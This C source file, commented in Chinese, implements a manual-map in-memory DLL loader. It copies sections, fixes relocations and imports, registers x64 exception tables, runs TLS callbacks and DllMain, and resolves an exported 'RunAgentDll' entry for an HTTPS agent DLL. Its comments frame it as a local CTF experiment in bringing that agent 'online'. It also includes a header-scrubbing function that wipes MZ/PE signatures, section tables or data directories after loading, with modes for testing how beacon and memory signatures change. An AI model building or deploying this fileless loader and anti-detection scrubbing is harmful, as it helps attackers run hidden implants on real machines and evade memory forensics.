#include "MemoryModulePP_Lite.h"
#include <string.h>

/*
 * 文件作用：MemoryModulePP 风格的 MinGW 可编译内存 DLL 加载器。
 *
 * 小白版理解：Windows 正常加载 DLL 时，会做一串固定动作：
 * 1. 按 PE 头申请一块内存；
 * 2. 把 DLL 的 headers 和每个 section 复制到正确位置；
 * 3. 如果没有放到原始 ImageBase，就修复重定位表；
 * 4. 把 DLL 依赖的系统 DLL/API 写进导入表；
 * 5. 给 .text/.data 等 section 设置合适的内存权限；
 * 6. 调用 DLL 入口点，让 CRT/DllMain 初始化；
 * 7. 后续通过导出表找到 RunAgentDll 这样的函数。
 *
 * 这个文件就是把上述流程用普通 WinAPI 手写一遍，用于本地 CTF 学习和 direct_https DLL 上线实验。
 */

#ifndef IMAGE_SIZEOF_BASE_RELOCATION
#define IMAGE_SIZEOF_BASE_RELOCATION 8
#endif

struct MMPP_LITE_MODULE {
    /*
     * codeBase 是手动映射后 DLL 在当前进程里的“新基址”。
     * 正常 LoadLibrary 会返回 HMODULE，本质上也是类似的基址。
     */
    unsigned char* codeBase;
    size_t imageSize;
    /* 记录本 DLL 依赖并由本 loader LoadLibraryA 打开的模块，释放时逐个 FreeLibrary。 */
    HMODULE* imports;
    DWORD importCount;
    DWORD importCap;
    BOOL initialized;
    BOOL isDll;
    PIMAGE_NT_HEADERS nt;
    BOOL (WINAPI *entry)(HINSTANCE, DWORD, LPVOID);
#if defined(_WIN64)
    PRUNTIME_FUNCTION functionTable;
    DWORD functionTableCount;
    BOOL functionTableRegistered;
#endif
};

static char g_last_error[160];

/*
 * 写诊断日志。
 *
 * loader 会把日志路径放进环境变量 MMPP_LOADER_LOG。MemoryModulePP_Lite
 * 不直接知道外层 loader 的路径参数，所以通过环境变量取日志位置。
 */
static void lite_diag_log(const char* text)
{
    char path[MAX_PATH];
    DWORD n;
    HANDLE h;
    DWORD written = 0;
    if (!text) return;
    n = GetEnvironmentVariableA("MMPP_LOADER_LOG", path, (DWORD)sizeof(path));
    if (!n || n >= sizeof(path)) return;
    h = CreateFileA(path, FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return;
    WriteFile(h, text, (DWORD)lstrlenA(text), &written, NULL);
    WriteFile(h, "\r\n", 2, &written, NULL);
    CloseHandle(h);
}

/* 写入 “前缀 + 值” 形式的诊断行，例如 MMPP_IMPORT_DLL=KERNEL32.dll。 */
static void lite_diag_log2(const char* prefix, const char* value)
{
    char buf[260];
    lstrcpynA(buf, prefix ? prefix : "", (int)sizeof(buf));
    lstrcpynA(buf + lstrlenA(buf), value ? value : "", (int)(sizeof(buf) - lstrlenA(buf)));
    lite_diag_log(buf);
}

/* 保存最近一次失败原因，并同步写诊断日志。 */
static void set_error_text(const char* text)
{
    if (!text) text = "unknown";
    lstrcpynA(g_last_error, text, (int)sizeof(g_last_error));
    lite_diag_log2("MMPP_LAST_ERROR=", text);
}

const char* MmpLiteLastErrorString(void)
{
    return g_last_error[0] ? g_last_error : "";
}

/*
 * append_import 记录本次手动加载过程中 LoadLibraryA 打开的依赖 DLL。
 *
 * 为什么要记录？
 * - build_import_table 里会把 direct_https DLL 依赖的 KERNEL32/ADVAPI/WinINet 等模块加载进来；
 * - 等 MmpLiteFreeLibrary 释放手动映射 DLL 时，也应该把这些引用逐个 FreeLibrary；
 * - 所以这里维护一个动态数组，专门保存 import HMODULE 列表。
 */
static int append_import(struct MMPP_LITE_MODULE* m, HMODULE h)
{
    HMODULE* next;
    if (!m || !h) return 0;
    if (m->importCount >= m->importCap) {
        DWORD newCap = m->importCap ? m->importCap * 2 : 8;
        next = m->imports
            ? (HMODULE*)HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, m->imports, newCap * sizeof(HMODULE))
            : (HMODULE*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, newCap * sizeof(HMODULE));
        if (!next) return 0;
        m->imports = next;
        m->importCap = newCap;
    }
    m->imports[m->importCount++] = h;
    return 1;
}

/*
 * 把 PE section 的 Characteristics 转成 Windows 内存页权限。
 *
 * 例子：
 * - .text 通常是可执行+可读 -> PAGE_EXECUTE_READ；
 * - .data 通常是可读+可写 -> PAGE_READWRITE；
 * - 没有读写执行权限的 section -> PAGE_NOACCESS。
 *
 * 这一步对应 Windows loader 正常加载 DLL 时做的“设置节权限”。
 */
static DWORD section_protection(DWORD characteristics)
{
    BOOL executable = (characteristics & IMAGE_SCN_MEM_EXECUTE) != 0;
    BOOL readable   = (characteristics & IMAGE_SCN_MEM_READ) != 0;
    BOOL writable   = (characteristics & IMAGE_SCN_MEM_WRITE) != 0;

    if (executable) {
        if (writable) return PAGE_EXECUTE_READWRITE;
        if (readable) return PAGE_EXECUTE_READ;
        return PAGE_EXECUTE;
    }
    if (writable) return PAGE_READWRITE;
    if (readable) return PAGE_READONLY;
    return PAGE_NOACCESS;
}

/*
 * 检查输入是否像一个当前架构可加载的 PE。
 *
 * 关键校验：
 * - DOS 头 magic 是否为 MZ；
 * - e_lfanew 是否能找到 NT 头；
 * - NT 头签名是否为 PE；
 * - 当前编译目标为 x64 时，输入必须是 PE32+ AMD64；
 * - SizeOfImage/SizeOfHeaders 必须合理。
 */
static int check_headers(const unsigned char* data, size_t size, PIMAGE_NT_HEADERS* outNt)
{
    PIMAGE_DOS_HEADER dos;
    PIMAGE_NT_HEADERS nt;
    if (!data || size < sizeof(IMAGE_DOS_HEADER)) {
        set_error_text("input too small");
        return 0;
    }
    dos = (PIMAGE_DOS_HEADER)data;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
        set_error_text("missing MZ signature");
        return 0;
    }
    if (dos->e_lfanew <= 0 || (size_t)dos->e_lfanew > size - sizeof(IMAGE_NT_HEADERS)) {
        set_error_text("invalid e_lfanew");
        return 0;
    }
    nt = (PIMAGE_NT_HEADERS)(data + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) {
        set_error_text("missing PE signature");
        return 0;
    }
#if defined(_WIN64)
    if (nt->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64 || nt->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
        set_error_text("not a PE32+ x64 image");
        return 0;
    }
#else
    if (nt->FileHeader.Machine != IMAGE_FILE_MACHINE_I386 || nt->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR32_MAGIC) {
        set_error_text("not a PE32 x86 image");
        return 0;
    }
#endif
    if (nt->OptionalHeader.SizeOfImage == 0 || nt->OptionalHeader.SizeOfHeaders == 0) {
        set_error_text("invalid image sizes");
        return 0;
    }
    *outNt = nt;
    return 1;
}

/*
 * 把 DLL 文件里的 headers 和 sections 复制到新映像内存。
 *
 * 这里要区分两个概念：
 * - 文件偏移：PointerToRawData，DLL 在磁盘文件里的位置；
 * - 内存 RVA：VirtualAddress，DLL 被加载到内存后应该放的位置。
 *
 * Windows loader 正常加载 PE 时，也会按 section 表把磁盘布局转换成内存布局。
 */
static int copy_image(struct MMPP_LITE_MODULE* m, const unsigned char* data, size_t size, PIMAGE_NT_HEADERS srcNt)
{
    PIMAGE_SECTION_HEADER sec;
    DWORD i;
    SIZE_T headerSize = srcNt->OptionalHeader.SizeOfHeaders;
    if (headerSize > size) {
        set_error_text("headers exceed file size");
        return 0;
    }
    lite_diag_log("MMPP_COPY_HEADERS_BEGIN");
    memcpy(m->codeBase, data, headerSize);
    m->nt = (PIMAGE_NT_HEADERS)(m->codeBase + ((PIMAGE_DOS_HEADER)m->codeBase)->e_lfanew);

    sec = IMAGE_FIRST_SECTION(srcNt);
    for (i = 0; i < srcNt->FileHeader.NumberOfSections; i++, sec++) {
        unsigned char* dest = m->codeBase + sec->VirtualAddress;
        DWORD rawSize = sec->SizeOfRawData;
        DWORD rawPtr = sec->PointerToRawData;
        DWORD virtualSize = sec->Misc.VirtualSize;
        DWORD copySize = rawSize;
        if (copySize && (rawPtr > size || copySize > size - rawPtr)) {
            set_error_text("section raw data out of file");
            return 0;
        }
        if (virtualSize == 0) virtualSize = rawSize;
        if (sec->VirtualAddress > m->imageSize || virtualSize > m->imageSize - sec->VirtualAddress) {
            set_error_text("section virtual range out of image");
            return 0;
        }
        if (copySize > virtualSize) copySize = virtualSize;
        if (copySize) memcpy(dest, data + rawPtr, copySize);
        if (virtualSize > copySize) memset(dest + copySize, 0, virtualSize - copySize);
    }
    lite_diag_log("MMPP_COPY_IMAGE_OK");
    return 1;
}

/*
 * 修复重定位表。
 *
 * PE 文件通常有一个“理想基址” ImageBase。如果 VirtualAlloc 正好把 DLL
 * 放到这个地址，很多绝对地址不用改；如果放不到，就需要按 delta 修复
 * relocation table 里的地址。
 *
 * x64 常见类型是 IMAGE_REL_BASED_DIR64，表示要修 64 位地址。
 */
static int perform_relocations(struct MMPP_LITE_MODULE* m)
{
    ULONGLONG delta;
    IMAGE_DATA_DIRECTORY* dir;
    PIMAGE_BASE_RELOCATION rel;
    DWORD remaining;

    lite_diag_log("MMPP_RELOC_BEGIN");
    delta = (ULONGLONG)((ULONG_PTR)m->codeBase - (ULONG_PTR)m->nt->OptionalHeader.ImageBase);
    if (delta == 0) return 1;

    dir = &m->nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    if (!dir->VirtualAddress || !dir->Size) {
        set_error_text("relocation needed but table missing");
        return 0;
    }

    rel = (PIMAGE_BASE_RELOCATION)(m->codeBase + dir->VirtualAddress);
    remaining = dir->Size;
    while (remaining >= sizeof(IMAGE_BASE_RELOCATION) && rel->SizeOfBlock) {
        DWORD count;
        WORD* item;
        DWORD idx;
        if (rel->SizeOfBlock > remaining || rel->SizeOfBlock < sizeof(IMAGE_BASE_RELOCATION)) {
            set_error_text("invalid relocation block");
            return 0;
        }
        count = (rel->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
        item = (WORD*)((unsigned char*)rel + sizeof(IMAGE_BASE_RELOCATION));
        for (idx = 0; idx < count; idx++) {
            WORD type = item[idx] >> 12;
            WORD off = item[idx] & 0x0fff;
            unsigned char* patch = m->codeBase + rel->VirtualAddress + off;
            switch (type) {
            case IMAGE_REL_BASED_ABSOLUTE:
                break;
#if defined(_WIN64)
            case IMAGE_REL_BASED_DIR64:
                *(ULONGLONG*)patch += delta;
                break;
#else
            case IMAGE_REL_BASED_HIGHLOW:
                *(DWORD*)patch += (DWORD)delta;
                break;
#endif
            default:
                set_error_text("unsupported relocation type");
                return 0;
            }
        }
        remaining -= rel->SizeOfBlock;
        rel = (PIMAGE_BASE_RELOCATION)((unsigned char*)rel + rel->SizeOfBlock);
    }
    lite_diag_log("MMPP_RELOC_OK");
    return 1;
}

/*
 * 修复导入表，也就是 IAT。
 *
 * DLL 代码里调用的 CloseHandle/CreateFileA/Sleep 等函数，编译时并不知道
 * 在当前进程里的真实地址。正常 Windows loader 会：
 * 1. 读取 import descriptor，知道依赖 KERNEL32.dll、msvcrt.dll 等；
 * 2. LoadLibrary 这些依赖；
 * 3. GetProcAddress 找每个 API；
 * 4. 把真实函数地址写入 FirstThunk / IAT。
 *
 * 手动映射 DLL 时，如果不做这一步，DLL 一调用系统 API 就会跳到错误地址。
 */
static int build_import_table(struct MMPP_LITE_MODULE* m)
{
    IMAGE_DATA_DIRECTORY* dir = &m->nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    PIMAGE_IMPORT_DESCRIPTOR imp;
    if (!dir->VirtualAddress || !dir->Size) return 1;

    lite_diag_log("MMPP_IMPORT_BEGIN");
    imp = (PIMAGE_IMPORT_DESCRIPTOR)(m->codeBase + dir->VirtualAddress);
    for (; imp->Name; imp++) {
        const char* dllName = (const char*)(m->codeBase + imp->Name);
        HMODULE h = LoadLibraryA(dllName);
        ULONGLONG* thunkRef;
        ULONGLONG* funcRef;
        lite_diag_log2("MMPP_IMPORT_DLL=", dllName);
        if (!h) {
            set_error_text("LoadLibraryA failed for import");
            return 0;
        }
        if (!append_import(m, h)) {
            FreeLibrary(h);
            set_error_text("failed to remember import module");
            return 0;
        }
        thunkRef = (ULONGLONG*)(m->codeBase + (imp->OriginalFirstThunk ? imp->OriginalFirstThunk : imp->FirstThunk));
        funcRef = (ULONGLONG*)(m->codeBase + imp->FirstThunk);
        for (; *thunkRef; thunkRef++, funcRef++) {
            FARPROC fn = NULL;
            if (IMAGE_SNAP_BY_ORDINAL64(*thunkRef)) {
                fn = GetProcAddress(h, (LPCSTR)IMAGE_ORDINAL64(*thunkRef));
            } else {
                PIMAGE_IMPORT_BY_NAME name = (PIMAGE_IMPORT_BY_NAME)(m->codeBase + (*thunkRef));
                lite_diag_log2("MMPP_IMPORT_API=", (const char*)name->Name);
                fn = GetProcAddress(h, (LPCSTR)name->Name);
            }
            if (!fn) {
                set_error_text("GetProcAddress failed for import");
                return 0;
            }
            *funcRef = (ULONGLONG)(ULONG_PTR)fn;
        }
    }
    lite_diag_log("MMPP_IMPORT_OK");
    return 1;
}

/*
 * 执行 TLS callbacks。
 *
 * 有些编译器/运行库会在 TLS 目录里放初始化函数。正常 LoadLibrary 会在
 * DllMain 前后处理这些 callback。手动加载如果漏掉，某些全局对象/运行库状态
 * 可能没有初始化，后续就会出现很隐蔽的崩溃。
 */
static int execute_tls_callbacks(struct MMPP_LITE_MODULE* m, DWORD reason)
{
    IMAGE_DATA_DIRECTORY* dir = &m->nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
    PIMAGE_TLS_DIRECTORY tls;
    PIMAGE_TLS_CALLBACK* cb;
    if (!dir->VirtualAddress || !dir->Size) return 1;
    lite_diag_log("MMPP_TLS_BEGIN");
    tls = (PIMAGE_TLS_DIRECTORY)(m->codeBase + dir->VirtualAddress);
    cb = (PIMAGE_TLS_CALLBACK*)(ULONG_PTR)tls->AddressOfCallBacks;
    if (!cb) return 1;
    while (*cb) {
        lite_diag_log("MMPP_TLS_CALLBACK");
        (*cb)((LPVOID)m->codeBase, reason, NULL);
        cb++;
    }
    lite_diag_log("MMPP_TLS_OK");
    return 1;
}

/*
 * 设置 headers/sections 的最终内存权限。
 *
 * 映射和修复阶段先用 PAGE_READWRITE 是为了方便写内存；
 * 完成后再把 .text 改成可执行、.rdata 改成只读、.data 改成可写。
 * 最后 FlushInstructionCache，确保 CPU 执行到的是最新代码。
 */
static int set_section_protections(struct MMPP_LITE_MODULE* m)
{
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(m->nt);
    DWORD i;
    DWORD oldProtect;
    lite_diag_log("MMPP_PROTECT_BEGIN");
    /* headers: read-only after copy/import/reloc work */
    VirtualProtect(m->codeBase, m->nt->OptionalHeader.SizeOfHeaders, PAGE_READONLY, &oldProtect);

    for (i = 0; i < m->nt->FileHeader.NumberOfSections; i++, sec++) {
        DWORD protect;
        DWORD size = sec->Misc.VirtualSize ? sec->Misc.VirtualSize : sec->SizeOfRawData;
        unsigned char* dest = m->codeBase + sec->VirtualAddress;
        if (!size) continue;
        protect = section_protection(sec->Characteristics);
        if (!VirtualProtect(dest, size, protect, &oldProtect)) {
            set_error_text("VirtualProtect failed for section");
            return 0;
        }
    }
    FlushInstructionCache(GetCurrentProcess(), m->codeBase, m->imageSize);
    lite_diag_log("MMPP_PROTECT_OK");
    return 1;
}

static int register_exception_table(struct MMPP_LITE_MODULE* m)
{
#if defined(_WIN64)
    IMAGE_DATA_DIRECTORY* dir;
    DWORD count;

    if (!m || !m->nt || !m->codeBase) {
        set_error_text("invalid module for exception table");
        return 0;
    }

    /*
     * x64 Windows 的 C++/SEH 展开依赖 .pdata 异常函数表。
     *
     * 正常 LoadLibrary 加载 DLL 时，Windows loader 会自动把 .pdata 注册给运行时。
     * 但我们是手动把 DLL 映射进内存，所以也必须手动调用 RtlAddFunctionTable。
     * 否则 DLL 一旦走到需要栈展开/异常处理/部分 CRT 运行时代码的位置，就可能直接崩掉。
     */
    lite_diag_log("MMPP_EXCEPTION_TABLE_BEGIN");
    dir = &m->nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
    if (!dir->VirtualAddress || !dir->Size) {
        lite_diag_log("MMPP_EXCEPTION_TABLE_NONE");
        return 1;
    }
    if (dir->VirtualAddress > m->imageSize || dir->Size > m->imageSize - dir->VirtualAddress) {
        set_error_text("exception table out of image");
        return 0;
    }
    count = dir->Size / sizeof(RUNTIME_FUNCTION);
    if (!count) {
        lite_diag_log("MMPP_EXCEPTION_TABLE_EMPTY");
        return 1;
    }

    m->functionTable = (PRUNTIME_FUNCTION)(m->codeBase + dir->VirtualAddress);
    m->functionTableCount = count;
    if (!RtlAddFunctionTable(m->functionTable, m->functionTableCount, (DWORD64)(ULONG_PTR)m->codeBase)) {
        set_error_text("RtlAddFunctionTable failed");
        return 0;
    }
    m->functionTableRegistered = TRUE;
    lite_diag_log("MMPP_EXCEPTION_TABLE_OK");
    return 1;
#else
    (void)m;
    return 1;
#endif
}

HMEMORYMODULEPP_LITE MmpLiteLoadLibraryFromMemory(const void* data, size_t size)
{
    PIMAGE_NT_HEADERS srcNt = NULL;
    struct MMPP_LITE_MODULE* m = NULL;
    LPVOID preferred = NULL;
    SIZE_T imageSize;
    char infoBuf[128];

    g_last_error[0] = 0;
    lite_diag_log("MMPP_LOAD_BEGIN");
    if (!check_headers((const unsigned char*)data, size, &srcNt)) return NULL;
    lite_diag_log("MMPP_HEADERS_OK");

    m = (struct MMPP_LITE_MODULE*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(*m));
    if (!m) {
        set_error_text("module allocation failed");
        return NULL;
    }

    /*
     * 先尝试申请 DLL 自己喜欢的 ImageBase。
     * 成功的话 relocation delta 为 0；失败也没关系，后面会申请任意地址
     * 并通过 perform_relocations 修正绝对地址。
     */
    imageSize = srcNt->OptionalHeader.SizeOfImage;
    preferred = VirtualAlloc((LPVOID)(ULONG_PTR)srcNt->OptionalHeader.ImageBase, imageSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (!preferred) preferred = VirtualAlloc(NULL, imageSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (!preferred) {
        HeapFree(GetProcessHeap(), 0, m);
        set_error_text("VirtualAlloc image failed");
        return NULL;
    }
    m->codeBase = (unsigned char*)preferred;
    m->imageSize = imageSize;
    lite_diag_log("MMPP_ALLOC_OK");
    wsprintfA(infoBuf, "MMPP_IMAGE_BASE=%p", m->codeBase);
    lite_diag_log(infoBuf);
    wsprintfA(infoBuf, "MMPP_IMAGE_SIZE=%lu", (unsigned long)m->imageSize);
    lite_diag_log(infoBuf);

    /*
     * 下面三步是 PE 手动加载的核心：
     * - copy_image：磁盘布局 -> 内存布局；
     * - perform_relocations：修复基址变化造成的绝对地址；
     * - build_import_table：填好系统 API 函数地址。
     */
    if (!copy_image(m, (const unsigned char*)data, size, srcNt) ||
        !perform_relocations(m) ||
        !build_import_table(m)) {
        MmpLiteFreeLibrary(m);
        return NULL;
    }
    /*
     * 更新内存中 PE 头的 ImageBase。
     * 注意：这个写操作必须在 set_section_protections() 之前完成；
     * set_section_protections() 会把 headers 改成 PAGE_READONLY，
     * 如果之后再写 OptionalHeader.ImageBase，就会触发 0xc0000005。
     */
    m->nt->OptionalHeader.ImageBase = (ULONG_PTR)m->codeBase;

    /*
     * 下面三步是让 DLL “真正像被系统加载过一样”：
     * - x64 exception table：避免 C++/SEH/栈展开异常；
     * - section protection：恢复正常页面权限；
     * - TLS callbacks：执行运行库/编译器 TLS 初始化。
     */
    if (!register_exception_table(m) ||
        !set_section_protections(m) ||
        !execute_tls_callbacks(m, DLL_PROCESS_ATTACH)) {
        MmpLiteFreeLibrary(m);
        return NULL;
    }

    m->isDll = (m->nt->FileHeader.Characteristics & IMAGE_FILE_DLL) != 0;
    /*
     * 最后调用 DllMain(DLL_PROCESS_ATTACH)。
     * 只有 DllMain 成功返回后，才认为这个 DLL 完成了加载初始化。
     */
    if (m->nt->OptionalHeader.AddressOfEntryPoint) {
        m->entry = (BOOL (WINAPI*)(HINSTANCE, DWORD, LPVOID))(m->codeBase + m->nt->OptionalHeader.AddressOfEntryPoint);
        if (m->isDll) {
            lite_diag_log("MMPP_DLLMAIN_BEGIN");
            if (!m->entry((HINSTANCE)m->codeBase, DLL_PROCESS_ATTACH, NULL)) {
                set_error_text("DllMain returned FALSE");
                MmpLiteFreeLibrary(m);
                return NULL;
            }
            lite_diag_log("MMPP_DLLMAIN_OK");
            m->initialized = TRUE;
        }
    }
    lite_diag_log("MMPP_LOAD_OK");
    return m;
}

/*
 * 从内存映射 DLL 的 export table 中查找函数。
 *
 * 本实验主要查名字导出 RunAgentDll。这里也保留了序号导出路径，但不支持
 * forwarded export（导出转发到另一个 DLL 的情况），因为 direct_https DLL
 * 不需要这个高级特性。
 */
FARPROC MmpLiteGetProcAddress(HMEMORYMODULEPP_LITE module, const char* name)
{
    struct MMPP_LITE_MODULE* m = (struct MMPP_LITE_MODULE*)module;
    IMAGE_DATA_DIRECTORY* dir;
    PIMAGE_EXPORT_DIRECTORY exp;
    DWORD* functions;
    DWORD* names;
    WORD* ordinals;
    DWORD i;
    DWORD ordinal;

    if (!m || !m->codeBase || !name) {
        set_error_text("invalid getproc arguments");
        return NULL;
    }
    dir = &m->nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!dir->VirtualAddress || !dir->Size) {
        set_error_text("export table missing");
        return NULL;
    }
    exp = (PIMAGE_EXPORT_DIRECTORY)(m->codeBase + dir->VirtualAddress);
    functions = (DWORD*)(m->codeBase + exp->AddressOfFunctions);
    names = (DWORD*)(m->codeBase + exp->AddressOfNames);
    ordinals = (WORD*)(m->codeBase + exp->AddressOfNameOrdinals);

    if (((ULONG_PTR)name >> 16) == 0) {
        ordinal = (DWORD)(ULONG_PTR)name;
        if (ordinal < exp->Base || ordinal >= exp->Base + exp->NumberOfFunctions) {
            set_error_text("ordinal out of range");
            return NULL;
        }
        return (FARPROC)(m->codeBase + functions[ordinal - exp->Base]);
    }

    for (i = 0; i < exp->NumberOfNames; i++) {
        const char* exportName = (const char*)(m->codeBase + names[i]);
        if (lstrcmpA(exportName, name) == 0) {
            DWORD rva = functions[ordinals[i]];
            if (rva >= dir->VirtualAddress && rva < dir->VirtualAddress + dir->Size) {
                set_error_text("forwarded export not supported in lite loader");
                return NULL;
            }
            return (FARPROC)(m->codeBase + rva);
        }
    }
    set_error_text("export name not found");
    return NULL;
}

/*
 * 对已映射 DLL 的 PE header 做最小化处理实验。
 *
 * 设计约束：
 * - 必须在 MmpLiteGetProcAddress("RunAgentDll") 成功之后调用，否则 export table
 *   被破坏后 loader 自己可能再也找不到入口。
 * - mode 1/2/3/4 尽量只改一个 header 维度，方便观察“上线/命令/内存特征”的差异。
 * - mode 4 只清 OptionalHeader.DataDirectory 的若干目录项，不清实际 IAT 或目录表体；
 *   避免把已经填好的导入函数指针清掉。
 */
int MmpLiteScrubPeHeaders(HMEMORYMODULEPP_LITE module, int mode)
{
    struct MMPP_LITE_MODULE* m = (struct MMPP_LITE_MODULE*)module;
    PIMAGE_DOS_HEADER dos;
    PIMAGE_NT_HEADERS nt;
    DWORD oldProtect = 0;
    DWORD tmpProtect = 0;
    DWORD headerSize;
    char buf[96];

    if (!m || !m->codeBase || !m->nt) {
        set_error_text("invalid module for header scrub");
        return 0;
    }
    if (mode <= 0) {
        lite_diag_log("MMPP_HEADER_SCRUB_DISABLED");
        return 1;
    }

    dos = (PIMAGE_DOS_HEADER)m->codeBase;
    nt = m->nt;
    headerSize = nt->OptionalHeader.SizeOfHeaders;
    if (!headerSize || headerSize > m->imageSize) {
        set_error_text("invalid header size for scrub");
        return 0;
    }

    wsprintfA(buf, "MMPP_HEADER_SCRUB_MODE=%d", mode);
    lite_diag_log("MMPP_HEADER_SCRUB_BEGIN");
    lite_diag_log(buf);
    wsprintfA(buf, "MMPP_HEADER_SCRUB_SIZE=%lu", (unsigned long)headerSize);
    lite_diag_log(buf);

    if (!VirtualProtect(m->codeBase, headerSize, PAGE_READWRITE, &oldProtect)) {
        set_error_text("VirtualProtect failed for header scrub");
        return 0;
    }

    switch (mode) {
    case 1:
        /* V1：只处理 DOS MZ。 */
        ((unsigned char*)dos)[0] = 0;
        ((unsigned char*)dos)[1] = 0;
        break;

    case 2:
        /* V2：处理 DOS MZ + NT signature。 */
        ((unsigned char*)dos)[0] = 0;
        ((unsigned char*)dos)[1] = 0;
        nt->Signature = 0;
        break;

    case 3: {
        /* V3：只处理 section header table。 */
        PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
        DWORD tableSize = nt->FileHeader.NumberOfSections * sizeof(IMAGE_SECTION_HEADER);
        if ((unsigned char*)sec < m->codeBase || (unsigned char*)sec + tableSize > m->codeBase + headerSize) {
            VirtualProtect(m->codeBase, headerSize, oldProtect, &tmpProtect);
            set_error_text("section header table outside headers");
            return 0;
        }
        memset(sec, 0, tableSize);
        break;
    }

    case 4: {
        /*
         * V4：只处理部分 data directory 项。
         * 保留 EXCEPTION/TLS，避免干扰已经注册的 x64 unwind 信息和 TLS 相关释放路径；
         * 仅清掉已完成加载后通常不再需要的目录入口。
         */
        IMAGE_DATA_DIRECTORY* dir = nt->OptionalHeader.DataDirectory;
        int indexes[] = {
            IMAGE_DIRECTORY_ENTRY_EXPORT,
            IMAGE_DIRECTORY_ENTRY_IMPORT,
            IMAGE_DIRECTORY_ENTRY_RESOURCE,
            IMAGE_DIRECTORY_ENTRY_SECURITY,
            IMAGE_DIRECTORY_ENTRY_BASERELOC,
            IMAGE_DIRECTORY_ENTRY_DEBUG,
            IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT,
            IMAGE_DIRECTORY_ENTRY_IAT,
            IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT,
            IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR
        };
        unsigned int i;
        for (i = 0; i < sizeof(indexes) / sizeof(indexes[0]); i++) {
            dir[indexes[i]].VirtualAddress = 0;
            dir[indexes[i]].Size = 0;
        }
        break;
    }

    case 5:
        /* V5：处理完整 headers。 */
        memset(m->codeBase, 0, headerSize);
        break;

    default:
        VirtualProtect(m->codeBase, headerSize, oldProtect, &tmpProtect);
        set_error_text("unknown header scrub mode");
        return 0;
    }

    FlushInstructionCache(GetCurrentProcess(), m->codeBase, headerSize);
    VirtualProtect(m->codeBase, headerSize, oldProtect, &tmpProtect);
    lite_diag_log("MMPP_HEADER_SCRUB_OK");
    return 1;
}

/*
 * 释放手动映射 DLL。
 *
 * 注意顺序：
 * 1. 如果已经初始化，先执行 TLS detach 和 DllMain detach；
 * 2. x64 下注销 RtlAddFunctionTable 注册过的异常函数表；
 * 3. 释放导入模块引用；
 * 4. VirtualFree 映像内存；
 * 5. 释放 MMPP_LITE_MODULE 结构。
 */
void MmpLiteFreeLibrary(HMEMORYMODULEPP_LITE module)
{
    struct MMPP_LITE_MODULE* m = (struct MMPP_LITE_MODULE*)module;
    if (!m) return;
    if (m->initialized && m->entry) {
        execute_tls_callbacks(m, DLL_PROCESS_DETACH);
        m->entry((HINSTANCE)m->codeBase, DLL_PROCESS_DETACH, NULL);
    }
#if defined(_WIN64)
    if (m->functionTableRegistered && m->functionTable) {
        RtlDeleteFunctionTable(m->functionTable);
        m->functionTableRegistered = FALSE;
    }
#endif
    if (m->imports) {
        DWORD i;
        for (i = 0; i < m->importCount; i++) {
            if (m->imports[i]) FreeLibrary(m->imports[i]);
        }
        HeapFree(GetProcessHeap(), 0, m->imports);
    }
    if (m->codeBase) VirtualFree(m->codeBase, 0, MEM_RELEASE);
    HeapFree(GetProcessHeap(), 0, m);
}
